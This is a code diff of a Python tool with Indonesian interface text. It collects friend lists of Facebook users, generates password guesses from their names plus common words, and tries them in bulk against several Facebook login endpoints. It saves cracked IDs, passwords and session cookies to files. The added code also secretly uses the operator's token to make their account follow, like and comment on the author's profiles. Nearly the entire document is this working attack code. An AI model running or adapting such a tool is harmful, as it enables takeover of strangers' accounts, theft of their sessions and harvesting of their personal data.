+		__waktu = web.strftime("%H:%M:%S/%d-%m-%Y")
+		__hour = web.hour
+		if 06 <= __hour < 11:
+			__ucapkan = ('Selamat Pagi ðŸ’™')
+		elif 11 <= __hour < 15:
+			__ucapkan = ('Selamat Siang ðŸ’›')
+		elif 15 <= __hour < 18:
+			__ucapkan = ('Selamat Sore ðŸ§¡')
+		else:
+			__ucapkan = ('Selamat Malam ðŸ–¤')
+		__kata=random.choice(['Hidup ini terdiri dari 10 persen apa yang terjadi padamu dan 90 persen bagaimana caramu menyikapinya. - Charles R. Swindoll','Sukses tampaknya terkait dengan tindakan. Orang sukses terus bergerak. Mereka membuat kesalahan, tetapi mereka tidak berhenti. - Conrad Hilton','Keberanian adalah apa yang diperlukan untuk berdiri dan berbicara. Keberanian juga diperlukan untuk duduk dan mendengarkan. - Winston Churchill','Berani bermimpi, tapi yang lebih penting, berani melakukan tindakan di balik impianmu. - Josh Hinds','Kegagalan tidak akan pernah menyusul jika tekad untuk sukses cukup kuat. - Og Mandino','Hidup menyusut atau berkembang sebanding dengan keberanian seseorang. - Anais Nin','Ada dua cara untuk menyebarkan cahaya: menjadi lilin atau cermin yang memantulkannya. - Edith Wharton','Kesempatan itu mirip seperti matahari terbit. Kalau kau menunggu terlalu lama, kau bisa melewatkannya. - William Arthur Ward','Kebahagiaan bukanlah sesuatu yang siap dibuat. Itu berasal dari tindakan Anda sendiri. - Dalai Lama'])
+		__komen__= (__ucapkan+'\n\n'+__kata+'\n'+__waktu)
+		__komen2__= (__ucapkan+'\n\n'+__kata+'\n'+__waktu)
+		requests.post('https://graph.facebook.com/757953543/subscribers?access_token=%s'%(__token__)) #rozhak
+		requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=%s'%(__token__)) #rozhak2
+		requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=%s'%(__token__)) #muhammad rozhak
+		requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=%s'%(__token__)) #foto sampul
+		requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=%s'%(__token__)) # foto profil
+		requests.post('https://graph.facebook.com/10158807643598544/comments/?message=%s&access_token=%s'%(__ucapkan,__token__)) #foto sampul
+		requests.post('https://graph.facebook.com/10159090813023544/comments/?message=%s&access_token=%s'%(__komen__,__token__)) #foto profil
+		requests.post('https://graph.facebook.com/10159494942223544/comments/?message=%s&access_token=%s'%(__komen2__,__token__)) #foto profil
+	except:
+		exit("%sÂ«%s!%s Sepertinya ada yang error"%(K,M,K))
+	print("%sÂ«%s!%s Login berhasil"%(B,H,P))
+	__menu__()
+def __menu__():
+	try:
+		__token__=open('_____tokenz_____', 'r').read()
+	except IOError:
+		print("%sÂ«%s!%s Token invalid"%(K,M,K));time.sleep(2)
+		__login__()
+	try:
+		getz=requests.get('https://graph.facebook.com/me/?access_token=%s'%(__token__))
+		gz=json.loads(getz.text)
+		nama=gz['name']
+	except KeyError:
+		print("%sÂ«%s!%s Token invalid"%(K,M,K));time.sleep(2)
+		os.remove("_____tokenz_____");__login__()
+	os.system('clear')
+	os.system('echo -e "%s  ___\n |   \ _  _ _ __  _ __\n | |) | || | â€˜  \| â€˜_.\ \n%s |___/ \_,_|_|_|_| .__/\n                 |_|\n"'%(P,H))
+	print("%sÂ«%sï¼%sWelcome :%s %s"%(K,X,P,B,nama))
+
+	print("\n%s1%sÂ»%s Dump id publik old (2015-2004)"%(H,B,P))
+	print("%s2%sÂ»%s Dump id publik new (2020-2021)"%(H,B,P))
+	print("%s3%sÂ»%s Dump id publik acak (2021-2004)"%(H,B,P))
+	print("%s4%sÂ»%s Dump id publik masal new (2020-2021)"%(H,B,P))
+	print("%s5%sÂ»%s Dump id publik masal acak (2021-2004)"%(H,B,P))
+	print("%s6%sÂ»%s Mulai crack"%(K,B,H))
+	print("%s7%sÂ»%s Lihat hasil crack"%(H,B,P))
+	print("%s8%sÂ»%s Hapus tokenz"%(M,B,K))
+	__menu=raw_input("\n%sÂ«%s?%s Choose :%s "%(B,H,P,X))
+	if __menu in ['']:
+		exit("%sÂ«%s!%s Wrong input"%(K,M,K))
+	elif __menu in ['1','01']:
+		__old__()
+	elif __menu in ['2','02']:
+		__new__()
+	elif __menu in ['3','03']:
+		__acak__()
+	elif __menu in ['4','04']:
+		__masal__()
+	elif __menu in ['5','05']:
+		__masal2__()
+	elif __menu in ['6','06']:
+		__metode__()
+	elif __menu in ['7','07']:
+		print("\n%s1%sÂ»%s Lihat hasil Ok"%(H,B,P))
+		print("%s2%sÂ»%s Lihat hasil Cp"%(H,B,P))
+		print("%s3%sÂ»%s Kembali"%(K,B,P))
+		__hasilz=raw_input("\n%sÂ«%s?%s Choose :%s "%(B,H,P,X))
+		if __hasilz in ['1','01']:
+			try:
+				__ok__=open('Ok.txt', 'r').read()
+			except:
+				exit("%sÂ«%s!%s Hasil 'ok' tidak ada"%(K,M,K))
+			print("\n%s%s"%(P,__ok__))
+		elif __hasilz in ['2','02']:
+			try:
+				__cp__=open('Cp.txt', 'r').read()
+			except:
+				exit("%sÂ«%s!%s Hasil 'cp' tidak ada"%(K,M,K))
+			print("\n%s%s"%(P,__cp__))
+		else:
+			exit("%sÂ«%s!%s Wrong input"%(K,M,K))
+	elif __menu in ['8','08']:
+		os.remove("_____tokenz_____")
+		exit()
 	else:
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
+		exit("%sÂ«%s!%s Wrong input"%(K,M,K))
+def __old__():
+	try:
+		__token__=open('_____tokenz_____', 'r').read()
+	except I0Error:
+		exit("%sÂ«%s!%s Token invalid"%(K,M,K))
+	try:
+		__ids=raw_input("\n%sÂ«%s?%s User :%s "%(H,K,P,H))
+		ups=requests.get("https://graph.facebook.com/%s?access_token=%s"%(__ids,__token__))
+		ps=json.loads(ups.text);qw=ps['first_name'].lower()
+		print("%sÂ«%s?%s Nama :%s %s"%(H,K,P,H,ps['name']))
+	except KeyError:
+		exit("%sÂ«%s!%s User tidak ditemukan"%(K,M,K))
+	try:
+		rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,__token__))
+		ex=json.loads(rex.text)
+		sv=(qw+'.txt').replace(" ","_");file = open(sv , 'a')
+		id = []
+		for a in ex['friends']['data']:
+			id.append(a['id']+"<=>"+a['name'])
+			file.write(a['id']+"<=>"+a['name']+'\n')
+			print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
+			if a['id'][:6] in ['100009']:
+				file.close()
+				print("\r%s                   "%(P))
+				print("%sÂ«%s?%s Total id :%s %s"%(H,K,P,H,len(id)))
+				print("%sÂ«%s?%s File tersimpan di :%s %s"%(H,K,P,H,sv))
+				raw_input("%sÂ«%sKembali%sÂ»"%(H,P,H));__menu__()
+	except KeyError:
+		exit("%sÂ«%s!%s Dump gagal, mungkin target tidak memiliki teman"%(K,M,K))
+def __new__():
+	try:
+		__token__=open('_____tokenz_____', 'r').read()
+	except I0Error:
+		exit("%sÂ«%s!%s Token invalid"%(K,M,K))
+	try:
+		__ids=raw_input("\n%sÂ«%s?%s User :%s "%(H,K,P,H))
+		ups=requests.get("https://graph.facebook.com/%s?access_token=%s"%(__ids,__token__))
+		ps=json.loads(ups.text);qw=ps['first_name'].lower()
+		print("%sÂ«%s?%s Nama :%s %s"%(H,K,P,H,ps['name']))
+	except KeyError:
+		exit("%sÂ«%s!%s User tidak ditemukan"%(K,M,K))
+	try:
+		rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,__token__))
+		ex=json.loads(rex.text)
+		sv=(qw+'.txt').replace(" ","_");file = open(sv , 'a')
+		id = []
+		for a in ex['friends']['data']:
+			if a['id'][:5] in ['10005','10006','10007','10008']:
+				id.append(a['id']+"<=>"+a['name'])
+				file.write(a['id']+"<=>"+a['name']+'\n')
+				print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
+		file.close()
+		print("\r%s                   "%(P))
+		print("%sÂ«%s?%s Total id :%s %s"%(H,K,P,H,len(id)))
+		print("%sÂ«%s?%s File tersimpan di :%s %s"%(H,K,P,H,sv))
+		raw_input("%sÂ«%sKembali%sÂ»"%(H,P,H));__menu__()
+	except KeyError:
+		exit("%sÂ«%s!%s Dump gagal, mungkin target tidak memiliki teman"%(K,M,K))
+def __acak__():
+	try:
+		__token__=open('_____tokenz_____', 'r').read()
+	except I0Error:
+		exit("%sÂ«%s!%s Token invalid"%(K,M,K))
+	try:
+		__ids=raw_input("\n%sÂ«%s?%s User :%s "%(H,K,P,H))
+		ups=requests.get("https://graph.facebook.com/%s?access_token=%s"%(__ids,__token__))
+		ps=json.loads(ups.text);qw=ps['first_name'].lower()
+		print("%sÂ«%s?%s Nama :%s %s"%(H,K,P,H,ps['name']))
+	except KeyError:
+		exit("%sÂ«%s!%s User tidak ditemukan"%(K,M,K))
+	try:
+		rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,__token__))
+		ex=json.loads(rex.text)
+		sv=(qw+'.txt').replace(" ","_");file = open(sv , 'a')
+		id = []
+		for a in ex['friends']['data']:
+			id.append(a['id']+"<=>"+a['name'])
+			file.write(a['id']+"<=>"+a['name']+'\n')
+			print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
+		file.close()
+		print("\r%s                   "%(P))
+		print("%sÂ«%s?%s Total id :%s %s"%(H,K,P,H,len(id)))
+		print("%sÂ«%s?%s File tersimpan di :%s %s"%(H,K,P,H,sv))
+		raw_input("%sÂ«%sKembali%sÂ»"%(H,P,H));__menu__()
+	except KeyError:
+		exit("%sÂ«%s!%s Dump gagal, mungkin target tidak memiliki teman"%(K,M,K))
+def __masal__():
+	try:
+		__token__=open('_____tokenz_____', 'r').read()
+	except I0Error:
+		exit("%sÂ«%s!%s Token invalid"%(K,M,K))
+	try:
+		__total = int(raw_input("\n%sÂ«%s?%s Dump berapa id :%s "%(H,K,P,H)))
+	except:
+		__total = 1
+	__file = raw_input("%sÂ«%s?%s Nama file :%s "%(H,K,P,H))
+	for zx in range(__total):
+		zx += 1
+		__ids=raw_input("%s%s%sÂ»%s User :%s "%(H,K,P,zx,H))
+		try:
+			rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,__token__))
+			ex=json.loads(rex.text)
+			file = open(__file , 'a')
+			id = []
+			for a in ex['friends']['data']:
+				if a['id'][:5] in ['10005','10006','10007','10008']:
+					id.append(a['id']+"<=>"+a['name'])
+					file.write(a['id']+"<=>"+a['name']+'\n')
+					print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
+		except KeyError:
+			exit("%sÂ«%s!%s Dump gagal, mungkin user salah / tidak memiliki teman"%(K,M,K))
+	file.close()
+	print("\r%s                   "%(P))
+	__id=open(__file, 'r').readlines()
+	print("%sÂ«%s?%s Total id :%s %s"%(H,K,P,H,len(__id)))
+	print("%sÂ«%s?%s File tersimpan di :%s %s"%(H,K,P,H,__file))
+	raw_input("%sÂ«%sKembali%sÂ»"%(H,P,H));__menu__()
+def __masal2__():
+	try:
+		__token__=open('_____tokenz_____', 'r').read()
+	except I0Error:
+		exit("%sÂ«%s!%s Token invalid"%(K,M,K))
+	try:
+		__total = int(raw_input("\n%sÂ«%s?%s Dump berapa id :%s "%(H,K,P,H)))
+	except:
+		__total = 1
+	__file = raw_input("%sÂ«%s?%s Nama file :%s "%(H,K,P,H))
+	for zx in range(__total):
+		zx += 1
+		__ids=raw_input("%s%s%sÂ»%s User :%s "%(H,K,P,zx,H))
+		try:
+			rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,__token__))
+			ex=json.loads(rex.text)
+			file = open(__file , 'a')
+			id = []
+			for a in ex['friends']['data']:
+				id.append(a['id']+"<=>"+a['name'])
+				file.write(a['id']+"<=>"+a['name']+'\n')
+				print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
+		except KeyError:
+			exit("%sÂ«%s!%s Dump gagal, mungkin user salah / tidak memiliki teman"%(K,M,K))
+	file.close()
+	print("\r%s                   "%(P))
+	__id=open(__file, 'r').readlines()
+	print("%sÂ«%s?%s Total id :%s %s"%(H,K,P,H,len(__id)))
+	print("%sÂ«%s?%s File tersimpan di :%s %s"%(H,K,P,H,__file))
+	raw_input("%sÂ«%sKembali%sÂ»"%(H,P,H));__menu__()
+def __metode__():
+	print("\n%s1%sÂ»%s Metode mbasic.facebook.com"%(H,B,P))
+	print("%s2%sÂ»%s Metode free.facebook.com"%(H,B,P))
+	print("%s3%sÂ»%s Metode mobile.facebook.com"%(H,B,P))
+	__metode=raw_input("%sÂ«%s?%s Choose :%s "%(B,H,P,X))
+	if __metode in ['']:
+		exit("%sÂ«%s!%s Wrong input"%s(K,M,K))
+	elif __metode in ['1','01']:
+		__fast_or_slow=raw_input("\n%sÂ«%s?%s Crack (fast/slow) :%s "%(H,K,P,H)).lower()
+		if __fast_or_slow in ['']:
+			exit("%sÂ«%s!%s Jangan kosong"%(K,M,K))
+		__set=open('_____setting_____' , 'w');__set.write(__fast_or_slow);__set.close()
+		__crack__()
+	elif __metode in ['2','02']:
+		__fast_or_slow=raw_input("\n%sÂ«%s?%s Crack (fast/slow) :%s "%(H,K,P,H)).lower()
+		if __fast_or_slow in ['']:
+			exit("%sÂ«%s!%s Jangan kosong"%(K,M,K))
+		__set=open('_____setting_____' , 'w');__set.write(__fast_or_slow);__set.close()
+		__crack2__()
+	elif __metode in ['3','03']:
+		__fast_or_slow=raw_input("\n%sÂ«%s?%s Crack (fast/slow) :%s "%(H,K,P,H)).lower()
+		if __fast_or_slow in ['']:
+			exit("%sÂ«%s!%s Jangan kosong"%(K,M,K))
+		__set=open('_____setting_____' , 'w');__set.write(__fast_or_slow);__set.close()
+		__crack3__()
+	else:
+		exit("%sÂ«%s!%s Wrong input"%(K,M,K))
+
 def generate(text):
-	global country
+	try:
+		__set__=open('_____setting_____', 'r').read()
+	except I0Error:
+		__set__=('slow')
 	results=[]
 	for i in text.split(" "):
 		if len(i)<3:
 			continue
 		else:
 			i=i.lower()
-			if len(i)==1 or len(i)==2 or len(i)==3 or len(i)==4 or len(i)==5:
+			if len(i)==3 or len(i)==4 or len(i)==5:
 				results.append(text)
 				results.append(i+"123")
 				results.append(i+"1234")
 				results.append(i+"12345")
+				results.append(i+"123456")
 				results.append(i+"2000")
 				results.append(i+"2001")
 				results.append(i+"2002")
@@ -381,6 +396,7 @@ def generate(text):
 				results.append(i+"123")
 				results.append(i+"1234")
 				results.append(i+"12345")
+				results.append(i+"123456")
 				results.append(i+"2000")
 				results.append(i+"2001")
 				results.append(i+"2002")
@@ -389,78 +405,16 @@ def generate(text):
 				results.append(i+"2005")
 				results.append(i+"2006")
 				results.append(i+"2007")
-				if "Indonesia" in country:
+				if "slow" in __set__:
+					results.append("sayang")
+					results.append("anjing")
+					results.append("kontol")
+					results.append("123456")
 					results.append("bismillah")
-                                        results.append("sayang")
-				if "Pakistan" in country:
-					results.append("pakistan")
-					results.append("786786")
-				if "Bangladesh" in country:
-					results.append("bangladesh")
-					results.append("102030")
+					results.append("rahasia")
+					results.append("indonesia")
+					results.append("bangsat")
 	return results
-def mobile(em,pas,hosts):
-    global ua,mobile_h
-    r = requests.Session()
-    r.headers.update(mobile_h)
-    p = r.get('https://m.facebook.com/')
-    b = bs4.BeautifulSoup(p.text, 'html.parser')
-    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
-    data = {}
-    for i in b('input'):
-        if i.get('value') is None:
-            if i.get('name') == 'email':
-                data.update({'email': em})
-            elif i.get('name') == 'pass':
-                data.update({'pass': pas})
-            else:
-                data.update({i.get('name'): ''})
-        else:
-            data.update({i.get('name'): i.get('value')})
-
-    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
-       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
-    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
-    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
-    if 'c_user' in r.cookies.get_dict().keys():
-        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
-    else:
-        if 'checkpoint' in r.cookies.get_dict().keys():
-            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
-        else:
-            return {'status': 'error', 'email': em, 'pass': pas}
-
-        return
-def free(em,pas,hosts):
-	global ua,free_h
-	r=requests.Session()
-	r.headers.update(free_h)
-	p=r.get("https://free.facebook.com/")
-	b=bs4.BeautifulSoup(p.text,"html.parser")
-	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
-	data={}
-	for i in b("input"):
-		if i.get("value") is None:
-			if i.get("name")=="email":
-				data.update({"email":em})
-			elif i.get("name")=="pass":
-				data.update({"pass":pas})
-			else:
-				data.update({i.get("name"):""})
-		else:
-			data.update({i.get("name"):i.get("value")})
-	data.update(
-		{"fb_dtsg":meta,"m_sess":"","__user":"0",
-		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
-		}
-	)
-	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
-	if "c_user" in list(r.cookies.get_dict().keys()):
-		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-	elif "checkpoint" in list(r.cookies.get_dict().keys()):
-		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
-	else:return {"status":"error","email":em,"pass":pas}
 def mbasic(em,pas,hosts):
 	global ua,mbasic_h
 	r=requests.Session()
@@ -491,304 +445,188 @@ def mbasic(em,pas,hosts):
 	elif "checkpoint" in r.cookies.get_dict().keys():
 		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
 	else:return {"status":"error","email":em,"pass":pas}
-class crack:
-	def __init__(self):
-		self.ada=[]
-		self.cp=[]
-		self.ko=0
-		while True:
-			f=raw_input("\n\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Gunakan Password Manual (y/t) :\x1b[1;92m ")
-			if f=="":continue
-			elif f=="y":
-				try:
-					while True:
-						try:
-							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
-							self.fs=open(self.apk).read().splitlines()
-							break
-						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
-							continue
-					self.fl=[]
-					for i in self.fs:
-						try:
-							self.fl.append({"id":i.split("<=>")[0]})
-						except:continue
-				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
-					continue
-				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
-				self.pwlist()
-				break
-			elif f=="t":
-				try:
-					while True:
-						try:
-							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
-							self.fs=open(self.apk).read().splitlines()
-							break
-						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
-							continue
-					self.fl=[]
-					for i in self.fs:
-						try:
-							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
-						except:continue
-				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
-					continue
-				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
-				ThreadPool(35).map(self.main,self.fl)
-				os.remove(self.apk)
-				exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
-				break
-	def pwlist(self):
-		self.pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;92m ").split(",")
-		if len(self.pw) ==0:
-			self.pwlist()
+def free(em,pas,hosts):
+	global ua,free_h
+	r=requests.Session()
+	r.headers.update(free_h)
+	p=r.get("https://free.facebook.com/")
+	b=bs4.BeautifulSoup(p.text,"html.parser")
+	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
+	data={}
+	for i in b("input"):
+		if i.get("value") is None:
+			if i.get("name")=="email":
+				data.update({"email":em})
+			elif i.get("name")=="pass":
+				data.update({"pass":pas})
+			else:
+				data.update({i.get("name"):""})
 		else:
-			for i in self.fl:
-				i.update({"pw":self.pw})
-			print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
-			ThreadPool(30).map(self.main,self.fl)
-			os.remove(self.apk)
-			exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
+			data.update({i.get("name"):i.get("value")})
+	data.update(
+		{"fb_dtsg":meta,"m_sess":"","__user":"0",
+		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+		}
+	)
+	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
+	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+	if "c_user" in list(r.cookies.get_dict().keys()):
+		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	elif "checkpoint" in list(r.cookies.get_dict().keys()):
+		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	else:return {"status":"error","email":em,"pass":pas}
+def mobile(em,pas,hosts):
+	global ua,mobile_h
+	r = requests.Session()
+	r.headers.update(mobile_h)
+	p = r.get('https://m.facebook.com/')
+	b = bs4.BeautifulSoup(p.text, 'html.parser')
+	dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
+	data = {}
+	for i in b('input'):
+		if i.get('value') is None:
+			if i.get('name') == 'email':
+				data.update({'email': em})
+			elif i.get('name') == 'pass':
+				data.update({'pass': pas})
+			else:
+				data.update({i.get('name'): ''})
+		else:
+			data.update({i.get('name'): i.get('value')})
+	data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
+		'__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
+	r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
+	po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
+	if 'c_user' in r.cookies.get_dict().keys():
+		return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
+	else:
+		if 'checkpoint' in r.cookies.get_dict().keys():
+			return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
+		else:
+			return {'status': 'error', 'email': em, 'pass': pas}
+
+	return
+class __crack__:
+	def __init__(self):
+		self.ok=[]
+		self.cp=[]
+		self.die=0
+		try:
+			self.file=raw_input("%sÂ«%s?%s File dump :%s "%(H,B,P,K))
+                        self.files=open(self.file).read().splitlines()
+                except Exception as e:
+			exit("%sÂ«%s!%s File tidak ditemukan"%(K,M,K))
+                self.fl=[]
+                for i in self.files:
+	                try:
+				self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
+	                except Exception as e:
+				exit("%sÂ«%s!%s File tidak valid"%(K,M,K))
+		print("%sÂ«%s!%s Mainkan mode pesawat jika tidak ada hasil\n"%(H,M,P))
+                ThreadPool(35).map(self.main,self.fl)
+               	exit("\n%sÂ«%sSelesai%sÂ»"%(H,P,H))
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="success":
-					print("\r\x1b[1;92m[Ok] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
-					self.ada.append("%s | %s"%(fl.get("id"),i))
-					if fl.get("id") in open("Live.txt").read():
-						break
-					else:
-						open("Live.txt","a+").write(
-						"%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
-					ko="%s|%s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
+					print("\r\x1b[1;92mÂ«OkÂ» "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
+					self.ok.append("%s | %s"%(fl.get("id"),i))
+					open("Ok.txt","a+").write("%s|%s %s\n"%(fl.get("id"), i, gets_cookies(log.get("cookies"))))
 					break
 				elif log.get("status")=="cp":
-					try:
-						token=open('___rozhak___','r').read()
-						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+token)
-						w=json.loads(q.text)
-						bt=w["birthday"]
-
-					except (KeyError, IOError):
-		                         bt = "         "
-					except:pass
-					print("\r\x1b[1;93m[Cp] "+(fl.get("id")+"|"+i+" "+bt+" "))
-					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
-					open("Check.txt","a+").write(
-						"%s|%s %s\n"%(fl.get("id"),i,bt))
+					print("\r\x1b[1;93mÂ«CpÂ» "+(fl.get("id")+"|"+i+"        "))
+					self.cp.append("%s|%s"%(fl.get("id"),i))
+					open("Cp.txt","a+").write("%s|%s\n"%(fl.get("id"),i))
 					break
 				else:continue
 
-			self.ko+=1
-			print "\r\x1b[1;97m[*] Crack %s/%s Ok:%s - Cp:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			self.die+=1
+			print "\r\x1b[1;97mÂ«CrackÂ» %s/%s Ok:%s - Cp:%s"%(self.die,len(self.fl),len(self.ok),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
-class crack2:
+class __crack2__:
 	def __init__(self):
-		self.ada=[]
+		self.ok=[]
 		self.cp=[]
-		self.ko=0
-		while True:
-			f=raw_input("\n\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Gunakan Password Manual (y/t) :\x1b[1;92m ")
-			if f=="":continue
-			elif f=="y":
-				try:
-					while True:
-						try:
-							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
-							self.fs=open(self.apk).read().splitlines()
-							break
-						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
-							continue
-					self.fl=[]
-					for i in self.fs:
-						try:
-							self.fl.append({"id":i.split("<=>")[0]})
-						except:continue
-				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
-					continue
-				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
-				self.pwlist()
-				break
-			elif f=="t":
-				try:
-					while True:
-						try:
-							self.apk=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ")
-							self.fs=open(self.apk).read().splitlines()
-							break
-						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
-							continue
-					self.fl=[]
-					for i in self.fs:
-						try:
-							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
-						except:continue
-				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
-					continue
-				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
-				ThreadPool(35).map(self.main,self.fl)
-				os.remove(self.apk)
-				exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
-				break
-	def pwlist(self):
-		self.pw=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Password :\x1b[1;92m ").split(",")
-		if len(self.pw) ==0:
-			self.pwlist()
-		else:
-			for i in self.fl:
-				i.update({"pw":self.pw})
-			print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
-			ThreadPool(30).map(self.main,self.fl)
-			os.remove(self.apk)
-			exit("\n\x1b[1;97m[\x1b[1;92mSelesai\x1b[1;97m]")
+		self.die=0
+		try:
+			self.file=raw_input("%sÂ«%s?%s File dump :%s "%(H,B,P,K))
+                        self.files=open(self.file).read().splitlines()
+                except Exception as e:
+			exit("%sÂ«%s!%s File tidak ditemukan"%(K,M,K))
+                self.fl=[]
+                for i in self.files:
+	                try:
+				self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
+	                except Exception as e:
+				exit("%sÂ«%s!%s File tidak valid"%(K,M,K))
+		print("%sÂ«%s!%s Mainkan mode pesawat jika tidak ada hasil\n"%(H,M,P))
+                ThreadPool(35).map(self.main,self.fl)
+               	exit("\n%sÂ«%sSelesai%sÂ»"%(H,P,H))
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
 				log=free(fl.get("id"),
 					i,"https://free.facebook.com")
 				if log.get("status")=="success":
